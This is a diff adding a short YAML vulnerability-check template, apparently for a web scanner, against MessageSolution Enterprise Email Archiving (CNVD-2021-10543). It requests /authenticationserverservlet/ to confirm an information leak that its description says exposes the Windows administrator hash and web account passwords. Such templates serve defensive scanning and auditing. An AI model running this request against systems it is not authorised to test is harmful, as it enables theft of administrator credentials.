@@ -1,0 +1,20 @@
+name: MessageSolution EEA information disclosure (CNVD-2021-10543)
+manual: true
+query: title="MessageSolution Enterprise Email Archiving (EEA)"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /authenticationserverservlet/
+    expression: response.status == 200 && response.body.bcontains(b"administrator")
+expression: r0()
+detail:
+  author: PeiQi
+  links:
+  - http://wiki.peiqi.tech
+  description: Message solution enterprise e-mail archiving management system EEA
+    is an e-mail archiving system developed by Beijing Yixun Sida Technology Development
+    Co., Ltd. There is a general web information leakage in the system, such as the
+    windows server administrator hash and web account password
+  tags: Disclosure of Sensitive Information
